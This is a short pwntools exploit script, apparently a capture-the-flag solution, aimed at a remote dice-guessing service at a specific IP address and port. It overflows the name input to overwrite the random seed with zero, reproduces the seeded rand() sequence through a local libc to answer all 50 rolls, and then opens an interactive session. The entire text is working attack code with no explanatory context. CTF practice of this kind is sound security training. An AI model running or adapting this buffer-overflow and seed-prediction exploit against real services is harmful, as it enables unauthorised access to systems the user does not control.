from pwn import *
from ctypes import cdll

p = remote("111.198.29.45" , 30573)
libc = cdll.LoadLibrary("./libc.so.6")
# overwrite seed
name = "a" * 0x40 + p64(0) + "\n"
p.sendafter("Welcome, let me know your name: " , name)
libc.srand(0)
# guess ?
for i in range(50):
	value = libc.rand() % 6 + 1
	p.sendlineafter("Give me the point(1~6): " , str(value))
p.interactive()